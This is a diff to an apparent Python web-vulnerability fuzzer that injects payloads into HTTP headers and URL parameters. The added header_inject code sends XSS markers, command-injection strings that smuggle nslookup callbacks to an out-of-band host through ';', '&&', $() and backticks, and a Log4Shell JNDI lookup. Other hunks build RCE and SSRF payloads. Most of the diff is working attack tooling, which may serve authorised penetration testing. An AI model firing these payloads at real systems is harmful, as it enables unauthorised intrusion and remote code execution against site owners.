@@ -24,14 +24,39 @@ ref_count=-1
 with open('xsslogabhi/temp_stats/'+str(ID)+'.abhi','w') as ID1:
     ID1.write("not started")
 
-#from pyfiglet import Figlet
+#_____________*** deleting old junk *********___________________
+import os
+import datetime
+print(".... deleting 1 week old junk to free-up space")
+def delete_old_text_files(directory, days_threshold=7):
+    # Get current time
+    current_time = datetime.datetime.now()
 
-#******  title printing ******
+    # Calculate the threshold time (1 week ago)
+    threshold_time = current_time - datetime.timedelta(days=days_threshold)
 
-#f = Figlet(font='pagga')
-#print(Fore.RED +f.renderText('ultimate xss initiator    ' ))
-#f1 = Figlet(font='smblock')
-#print(Fore.WHITE +f1.renderText('- by Abhishek Dirisipo' ))
+    # List all files in the directory
+    files = os.listdir(directory)
+
+    for file in files:
+        file_path = os.path.join(directory, file)
+
+        # Check if the file is a text file and older than 1 week
+        if file.endswith(".abhi") and os.path.getmtime(file_path) < threshold_time.timestamp():
+            try:
+                os.remove(file_path)
+                print(f"Deleted: {file_path}")
+            except Exception as e:
+                print(f"Error deleting {file_path}: {e}")
+
+# Specify the directories
+directories = ['xsslogabhi/unique_stats/', 'xsslogabhi/temp_stats/','xsslogabhi/unique_stats/input/']
+
+# Delete old text files in each directory
+for directory in directories:
+    delete_old_text_files(directory)
+print(".... Done ")
+#_________________________________________________________________
 
 #*** pre defined 
 sql_flag=0
@@ -395,14 +420,23 @@ def my_function_owaspbypass(payload):
                             f1.write('\n'+' * '+url_for_fuzz.replace("FUZZ",payload))
 #******************************************************************************************************************
 
-#*************************************************** header ***********************************************************
+#*************************************************** header injection ***********************************************************
 
-def header_inject(headers, main_url):
-    header_values = ["%253cabhi%253e%2522%2522", "<abhi>%22%22"]
+from concurrent.futures import ThreadPoolExecutor
+import itertools
 
-    for header_value in header_values:
+def header_inject(headers, main_url, user_burp_input_with_number, num_threads):
+    header_values = [
+        "%253cabhi%253e%2522%2522<abhi>%22%22",
+        "a;nslookup%20bnslkupH" + user_burp_input_with_number + ";",
+        "a%26%26nslookup%20bnslkpH" + user_burp_input_with_number + "%26%26ls",
+        "${jndi:ldap://byl4j" + user_burp_input_with_number + ":8080/abhi4j}",
+        "$(nslookup%20bnslkpH" + user_burp_input_with_number + ")",
+        "`nslookup bnslkpH" + user_burp_input_with_number + "`"
+    ]
+
+    def inject_and_check(header_value):
         enable_header_inject = True
-
         try:
             requests.get(main_url, headers=headers, timeout=10)
         except:
@@ -416,7 +450,7 @@ def header_inject(headers, main_url):
             modified_headers[key] = header_value
 
             try:
-                print(f"\tCurrent header: {key}: {modified_headers[key]}", end="\r")
+                print(f"\tCurrent header: {key}: {modified_headers[key]}              ", end="\r")
 
                 if enable_header_inject:
                     response = requests.get(main_url, headers=modified_headers, timeout=30)
@@ -426,7 +460,7 @@ def header_inject(headers, main_url):
                 enable_header_inject = True
                 response_text = response.text.lower()
 
-                if "<abhi>\"\"" in response_text:
+                if '<abhi>""' in response_text:
                     print(" May be vulnerable to XSS through header: <abhi>\"\"")
                     log_xss(main_url, key, header_value)
 
@@ -437,7 +471,10 @@ def header_inject(headers, main_url):
                 else:
                     directories = ['bin', 'etc', 'boot', 'dev', 'home']
                     if all(directory in response_text for directory in directories):
-                        print(f"Vulnerable to RCE: {key}")
+                        print(f"Sensitive file names: {key}")
+                        with open('xsslogabhi/sensitive_file_logs.txt', 'a') as f1:
+                            string_to_write = f"\n[*] URL: {url} | {key}:{header_value}"
+                            f1.write(string_to_write)
 
             except requests.exceptions.Timeout:
                 print("\tHeader exception occurred, Request timed out")
@@ -445,13 +482,16 @@ def header_inject(headers, main_url):
             except requests.exceptions.RequestException as e:
                 print(f"\tRequest error: {e}")
                 enable_header_inject = False
-    print()
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        executor.map(inject_and_check, header_values)
 
 def log_xss(url, key, header_value):
     with open('xsslogabhi/header_reflections.txt', 'a') as f1:
         string_to_write = f"\n[*] URL: {url} | {key}:{header_value}"
         f1.write(string_to_write)
         print("\t-->", string_to_write)
+
 
 #**************************************************************************************************************
 
@@ -886,7 +926,8 @@ for url_for_fuzz in unique_urls:
             print(response)
             enable_header_inject2=True
             if main_url not in visited_main_urls_reflection and enable_header_inject and enable_header_inject2:
-                header_inject(headers,main_url)
+            
+                header_inject(headers,main_url,str(count)+"c"+str(ID)+"."+user_burp_input,thread_limit) # execute header injection function
                 
             if "429" in str(response):
                 print("! server is blocking the requests ! delaying 60 sec")
@@ -1632,7 +1673,7 @@ for url_for_fuzz in unique_urls:
             value="1"
             def rcepayload(cmd,user_burp_input2):
                 print("************************************"*2)
-                PL1=(cmd+' '+user_burp_input2)
+                PL1=(cmd+' '+user_burp_input2+';')
                 PL2=(value+" ; "+cmd+' '+user_burp_input2+' ; ls')
                 PL3=(value+" %26%26 "+cmd+' '+user_burp_input2+' %26%26 ls')
                 PL4=("${jndi:ldap://log4j."+user_burp_input2+':8080/abhi4j}')
@@ -1757,7 +1798,7 @@ for url_for_fuzz in unique_urls:
                 #********************** ssrf **********using same rce func ****************
             print("************************************"*2)
             print(".  ssrf   .")
-            PL7="https://direct"+str(count)+"a"+"."+str(ID)+"."+user_burp_input                
+            PL7="https://direct"+str(count)+"a."+str(ID)+"."+user_burp_input                
             t7 = threading.Thread(target=my_function_rce, args=(PL7,))                
             t7.start()                 
             #t7.join()
@@ -1790,23 +1831,6 @@ for url_for_fuzz in unique_urls:
 
 
 
-
-
-
-
-
-
-
-
-
-
     with open('xsslogabhi/resume_stats/'+fn+'.'+user_param_input,'w') as ID1:
         ID1.write(str(count))
         
-
-
-
-
-
-
-    
